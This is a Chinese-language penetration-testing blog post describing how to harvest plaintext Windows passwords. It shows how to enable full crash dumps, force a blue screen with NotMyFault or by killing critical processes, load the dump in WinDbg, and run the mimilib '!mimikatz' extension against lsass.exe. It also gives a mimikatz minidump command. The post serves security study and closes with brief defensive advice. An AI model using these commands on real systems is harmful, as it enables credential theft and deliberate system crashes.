---
layout: post
title: 渗透技巧——使用Mimilib从dump文件中导出口令
---


## 0x00 前言
---

在上篇文章[《Mimilib利用分析》](https://3gstudent.github.io/3gstudent.github.io/Mimilib%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)提到mimilib可作为WinDbg的插件进行使用，所以本文将会详细介绍这个插件的用法，实现从内核模式转储文件中导出口令，结合利用思路给出防御建议

## 0x01 简介
---

本文将要介绍以下内容：

- dump文件的分类
- 两种dump文件的导出方法
- WinDbg环境配置
- 利用思路
- 防御建议


## 0x02 dump文件的分类
---

dump文件分为以下两类：

### 1.User-Mode Dump File

即用户模式转储文件，分为以下两种：

- Full User-Mode Dumps
- Minidumps

简单理解：通常是针对单个进程

更多参考资料：

https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/user-mode-dump-files

创建方法：

可以使用Procdump进行创建

从用户模式转储文件导出口令的方法:

可参考之前的文章[《渗透基础-从lsass.exe进程导出凭据》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE/)

### 2.Kernel-Mode Dump Files

即内核模式转储文件，分为以下五种：

- Complete Memory Dump
- Kernel Memory Dump
- Small Memory Dump
- Automatic Memory Dump
- Active Memory Dump

简单理解：包括所有进程的信息

创建方法：

启动创建转储文件的功能，在系统崩溃(BSOD)时将自动创建

更多参考资料：

https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/kernel-mode-dump-files

## 0x03 从内核模式转储文件导出口令的方法
---

流程如下：

1.开启转储文件的功能
2.强制系统蓝屏(BSOD)，系统将会自动创建内核模式转储文件
3.使用WinDbg加载转储文件，调用mimilib导出明文口令

具体需要注意以下问题：

### 1.开启转储文件的功能

对应注册表位置：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CrashControl`，注册表项`CrashDumpEnabled`，类型为`REG_DWORD`

数值对应的功能如下：

- 0表示不启用
- 1表示完全内存转储
- 2表示核心内存转储
- 3表示内存转储

查看这个注册表对应的cmd命令如下：

```
reg query hklm\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled
```

这里需要将键值设置为`1`，开启完全内存转储的功能，否则使用WinDbg访问进程lsass.exe的内存时会提示具有无效的页目录，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-1.png)

修改这个注册表对应的cmd命令如下：

```
reg add hklm\SYSTEM\CurrentControlSet\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 1 /f
```

### 2.强制系统蓝屏(BSOD)

#### (1)通过结束属性为critical process的进程导致BSOD

默认为critical process的系统进程如下：

- csrss.exe
- lsass.exe
- services.exe
- smss.exe
- svchost.exe
- wininit.exe

这里也可以先将指定进程设置为critical process，结束该进程后也会导致BSOD

具体细节可参考之前的文章[《结束进程导致BSOD的利用分析》](https://3gstudent.github.io/3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)

#### (2)使用NotMyFault

下载地址：

https://docs.microsoft.com/en-us/sysinternals/downloads/notmyfault

触发蓝屏(BSOD)的命令如下：

```
notmyfault.exe -accepteula /crash
```

**注：**

NotMyFault还支持将当前系统挂起，命令如下：

```
notmyfault.exe -accepteula /hang
```

默认配置下，系统蓝屏(BSOD)后将会自动重启并生成文件`c:\windows\MEMORY.DMP`

### 3.使用WinDbg加载MEMORY.DMP

**注：**

WinDbg可以在安装SDK后自动安装

参考资料：

https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools

使用WinDbg，选择打开`Crash Dump`，选择MEMORY.DMP

获得dump文件详细信息的命令如下：

```
!analyze -v
```

报错提示：`Kernel symbols are WRONG. Please fix symbols to do analysis.`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-2.png)

这里需要修复符号文件，可以选择以下三种解决方法：

### (1) using the _NT_SYMBOL_PATH environment variable.

添加环境变量：

```
set _NT_SYMBOL_PATH=srv*c:\mysymbol*https://msdl.microsoft.com/download/symbols
```

### (2) using the -y <symbol_path> argument when starting the debugger.

使用WinDbg以指定参数启动

```
windbg.exe -y SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols
```

### (3)using .sympath and .sympath+

添加`Symbol File Path`

WinDbg的命令行操作：

```
.sympath SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols
```

也可以通过界面操作实现

`File`->`Symbol File Path ...`

填入`SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols`

设置以后，需要的符号文件会自动从Microsoft公共符号服务器下载

重新加载：

```
.Reload
```

测试：

```
!process 0 0 lsass.exe
```

加载正常，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-3.png)

如果这部分仍然失败，可尝试使用VPN连接互联网

如果测试环境无法连接互联网，可以通过SymChk获取清单文件的方式下载符号文件

参考资料：

https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/using-a-manifest-file-with-symchk

在无法连接互联网的计算机A上执行：

```
SymChk /om c:\Manifest\man.txt /id c:\test\MEMORY.DMP
```

获得文件`c:\Manifest\man.txt`，将其复制到可连接互联网的计算机B上，在计算机B上执行如下命令：

```
SymChk /im c:\test\man.txt /s srv*c:\mysymbolNew*https://msdl.microsoft.com/download/symbols
```

将会生成新的文件夹`c:\mysymbolNew`，将其复制到计算机A上，在计算机A上启动WinDbg并指定新的符号文件位置为`c:\mysymbolNew`，命令如下：

```
.symfix c:\mysymbolNew
```

测试：

```
.Reload
!process 0 0 lsass.exe
```

加载正常，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-6.png)

### 4.加载mimilib插件

可参考之前的文章[《Mimilib利用分析》](https://3gstudent.github.io/3gstudent.github.io/Mimilib%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)

### (1)方法1

将mimilib.dll保存至WinDbg的winext目录

我的测试环境(Server2012R2x64)保存的路径为：`C:\Program Files\Debugging Tools for Windows (x64)\winext`

启动WinDbg

加载插件的命令如下：

```
.load mimilib
```

### (2)方法2

直接加载mimilib的绝对路径，实例如下：

```
.load c:\test\mimilib
```

综上，搭建配置环境导出口令的完整命令如下：

```
.sympath SRV*c:\mysymbol*http://msdl.microsoft.com/download/symbols
.reload
!process 0 0 lsass.exe
.process 890f4530
.load c:\test\mimilib
.reload
!mimikatz
```

完整流程如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-4.png)

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-3-27/2-5.png)

将输出结果保存到文件中可使用以下命令：

```
.logopen c:\test\log.txt
!mimikatz
.logclose
```

## 0x04 利用思路
---

### 1.从用户模式转储文件导出口令

通过API `MiniDumpWriteDump()`获得进程lsass.exe的dump文件

使用mimikatz从dump文件中导出口令，命令如下:

```
mimikatz.exe log "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

### 2.从内核模式转储文件导出口令

开启转储文件的功能

强制系统蓝屏(BSOD)

使用WinDbg加载转储文件，调用mimilib导出明文口令

## 0x05 防御建议
---

### 1.从用户模式转储文件导出口令

拦截API `MiniDumpWriteDump()`的行为，部分安全产品已经支持这个功能

### 2.从内核模式转储文件导出口令

开启转储加密功能

参考资料：

https://docs.microsoft.com/en-us/windows-server/virtualization/hyper-v/manage/about-dump-encryption

**注：**

如果攻击者获得了系统的管理员权限，能够关闭转储加密的功能

## 0x06 小结
---

本文分别介绍了从用户模式转储文件和内核模式转储文件导出口令的方法，结合利用思路给出防御建议


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)











